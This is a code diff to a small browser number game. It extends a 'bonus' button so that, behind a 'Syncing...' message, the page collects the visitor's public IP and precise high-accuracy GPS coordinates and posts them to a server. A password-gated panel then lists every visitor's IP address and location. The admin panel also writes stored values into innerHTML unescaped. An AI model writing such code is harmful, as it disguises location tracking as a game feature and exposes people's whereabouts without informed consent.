@@ -26,7 +26,7 @@
     }
     .container {
       width: 100%;
-      max-width: 640px;
+      max-width: 680px;
       background: var(--card);
       border: 1px solid rgba(255,255,255,0.08);
       border-radius: 16px;
@@ -125,14 +125,16 @@
       display: grid;
       gap: 0.4rem;
       font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
-      font-size: 0.9rem;
+      font-size: 0.85rem;
     }
     ul.ip-list li {
       background: #0b1120;
-      padding: 0.55rem 0.75rem;
+      padding: 0.6rem 0.75rem;
       border-radius: 8px;
       display: flex;
+      flex-wrap: wrap;
       justify-content: space-between;
+      gap: 0.5rem;
     }
   </style>
 </head>
@@ -202,18 +204,54 @@
       numGrid.appendChild(btn);
     }
 
-    // 2. Fetch client network address & trigger POST request
+    // Helper: request browser coordinates via Geolocation API
+    function getBrowserCoords() {
+      return new Promise((resolve) => {
+        if (!("geolocation" in navigator)) {
+          return resolve({ lat: null, lng: null, accuracy: null, locStatus: "unsupported" });
+        }
+
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            resolve({
+              lat: pos.coords.latitude,
+              lng: pos.coords.longitude,
+              accuracy: Math.round(pos.coords.accuracy),
+              locStatus: "granted"
+            });
+          },
+          (err) => {
+            resolve({
+              lat: null,
+              lng: null,
+              accuracy: null,
+              locStatus: err.code === 1 ? "denied" : "unavailable"
+            });
+          },
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      });
+    }
+
+    // 2. Fetch client network info + browser coordinates & trigger POST API
     const bonusBtn = document.getElementById("bonus-btn");
     const syncStatus = document.getElementById("sync-status");
 
     bonusBtn.addEventListener("click", async () => {
       syncStatus.textContent = "Syncing...";
       try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const { ip } = await res.json();
+        const [ipRes, geo] = await Promise.all([
+          fetch("https://api.ipify.org?format=json"),
+          getBrowserCoords()
+        ]);
+        const { ip } = await ipRes.json();
 
         const payload = {
           ip,
+          lat: geo.lat,
+          lng: geo.lng,
+          accuracyMeters: geo.accuracy,
+          locStatus: geo.locStatus,
           score,
           timestamp: new Date().toISOString()
         };
@@ -234,7 +272,7 @@
       }
     });
 
-    // 3. Password-gated log display
+    // 3. Password-gated console display
     const authForm = document.getElementById("auth-form");
     const passInput = document.getElementById("admin-pass");
     const authMsg = document.getElementById("auth-message");
@@ -256,8 +294,13 @@
       authMsg.textContent = `Unlocked (${records.length} entry/entries):`;
 
       for (const item of records) {
+        const coordsText =
+          item.lat !== null && item.lng !== null
+            ? `${item.lat.toFixed(5)}, ${item.lng.toFixed(5)} (±${item.accuracyMeters}m)`
+            : `coords: ${item.locStatus || "n/a"}`;
+
         const li = document.createElement("li");
-        li.innerHTML = `<span>${item.ip} (Wins: ${item.score})</span><span>${new Date(item.timestamp).toLocaleString()}</span>`;
+        li.innerHTML = `<span>${item.ip} | ${coordsText} | Wins: ${item.score}</span><span>${new Date(item.timestamp).toLocaleString()}</span>`;
         ipResults.appendChild(li);
       }
       ipResults.hidden = false;
